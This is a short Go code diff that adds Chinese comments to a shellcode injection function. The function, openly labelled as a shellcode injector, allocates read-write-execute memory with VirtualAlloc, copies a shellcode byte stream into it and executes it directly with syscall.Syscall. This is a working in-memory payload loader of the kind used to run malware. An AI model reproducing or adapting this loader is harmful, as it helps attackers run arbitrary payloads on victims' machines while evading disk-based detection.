@@ -20,6 +20,7 @@ var (
 	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")   //内存块复制
 )
 
+//Inject shellcode注入函数
 func Inject(b []byte) {
 	//使用内存操作api开辟一块内存，然后将shellcode的字节流写入
 	addr, _, err := VirtualAlloc.Call(0, uintptr(len(b)), MemCommit|MemReserve, PageExecuteReadwrite)
@@ -31,6 +32,8 @@ func Inject(b []byte) {
 	if err != nil && err.Error() != "The operation completed successfully." {
 		syscall.Exit(0)
 	}
+	//为什么打印此行
+	//因为执行成功之后会返回The operation completed successfully，所以直接将其打印出来
 	fmt.Println(err)
 	syscall.Syscall(addr, 0, 0, 0, 0)
 }
